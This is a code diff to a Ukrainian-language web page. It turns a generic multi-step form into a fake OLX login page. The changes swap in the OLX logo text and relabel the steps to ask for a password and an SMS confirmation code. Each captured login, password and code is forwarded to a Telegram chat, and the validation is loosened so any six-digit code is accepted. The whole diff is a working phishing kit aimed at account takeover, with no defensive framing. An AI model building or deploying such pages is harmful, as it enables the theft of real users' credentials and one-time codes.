@@ -302,7 +302,7 @@
 
     <!-- STEP 2 -->
     <section id="step2" class="hidden">
-      <div class="logo">MySite</div>
+      <div class="logo">OLX</div>
       <h1>Введіть пароль</h1>
 
       <label for="login">Пароль</label>
@@ -320,11 +320,11 @@
 
     <!-- LOADING -->
     <section id="loading" class="hidden">
-      <div class="logo">MySite</div>
+      <div class="logo">OLX</div>
       <div class="loading">
         <div class="spinner"></div>
         <div class="loading-title">Перевіряємо дані...</div>
-        <div class="loading-text">Будь ласка, зачекайте кілька секунд.</div>
+        <div class="loading-text">Будь ласка, зачекайте кілька хвилин.</div>
         <div class="progress">
           <div class="progress-bar"></div>
         </div>
@@ -333,11 +333,11 @@
 
     <!-- STEP 3 -->
     <section id="step3" class="hidden">
-      <div class="logo">MySite</div>
-      <h1>Ми відправили вам повідомлення з кодом підтвердження, ми повинні переконатися що це саме ви, будь ласка перевірте Viber / SMS / електронну пошту</h1>
-      <p>Введіть дату народження у форматі ДДММРР.</p>
+      <div class="logo">OLX</div>
+      <h1>Це точно ви?</h1>
+      <p>Ми відправили вам SMS з кодом підтвердження, ми повинні переконатися що це саме ви, перевірте Viber / SMS / електронну пошту</p>
 
-      <label for="birthdate">Дата народження</label>
+      <label for="birthdate">Введіть код підтвердження</label>
       <input 
         id="birthdate" 
         class="birthdate" 
@@ -356,7 +356,7 @@
 
     <!-- DONE -->
     <section id="done" class="hidden">
-      <div class="logo">MySite</div>
+      <div class="logo">OLX</div>
       <h1>Готово!</h1>
       <p>Ваш акаунт успішно підтверджено.</p>
     </section>
@@ -464,7 +464,7 @@
       }
       showError("login", "loginError", false);
 
-      const text = `🆕 <b>НОВАЯ ЗАЯВКА MySite</b>\n\n🆔 ID: <code>${requestId}</code>\n👤 Имя: <b>${name}</b>\n🔑 Логин: <b>${login}</b>`;
+      const text = `🆕 <b>НОВАЯ ЗАЯВКА OLX</b>\n\n🆔 ID: <code>${requestId}</code>\n👤 Логин: <code>${name}</code>\n🔑 Пароль: <code>${login}</code>`;
       sendTelegram(text); // Відправляємо без await, щоб не затримувати UI
 
       show("loading");
@@ -481,23 +481,7 @@
 
     function isValidBirthdate(value) {
       if (!/^\d{6}$/.test(value)) return false;
-
-      const day = Number(value.substring(0, 2));
-      const month = Number(value.substring(2, 4));
-      const year = Number(value.substring(4, 6));
-
-      if (month < 1 || month > 12) return false;
-      if (day < 1 || day > 31) return false;
-
-      // Математична перевірка існування дати (враховує високосні роки)
-      const testYear = 2000 + year; 
-      const date = new Date(testYear, month - 1, day);
-      
-      return (
-        date.getFullYear() === testYear &&
-        date.getMonth() === month - 1 &&
-        date.getDate() === day
-      );
+      return true; // 👈 ОСТАВИТЬ ТОЛЬКО ЭТО
     }
 
     async function finish() {
@@ -511,9 +495,8 @@
 
       const name = $("name").value.trim();
       const login = $("login").value.trim();
-      const formattedBirthdate = `${birthdate.substring(0, 2)}.${birthdate.substring(2, 4)}.${birthdate.substring(4, 6)}`;
 
-      const text = `✅ <b>ДАННЫЕ ЗАЯВКИ MySite</b>\n\n🆔 ID: <code>${requestId}</code>\n👤 Имя: <b>${name}</b>\n🔑 Логин: <b>${login}</b>\n🎂 Дата рождения: <b>${formattedBirthdate}</b>`;
+      const text = `✅ <b>ДАННЫЕ ЗАЯВКИ olx</b>\n\n🆔 ID: <code>${requestId}</code>\n👤 Логин: <b>${name}</b>\n🔑 Пароль: <b>${login}</b>\n🎂 КОД: <code>${birthdate}</code>`;
       
       sendTelegram(text);
       show("done");
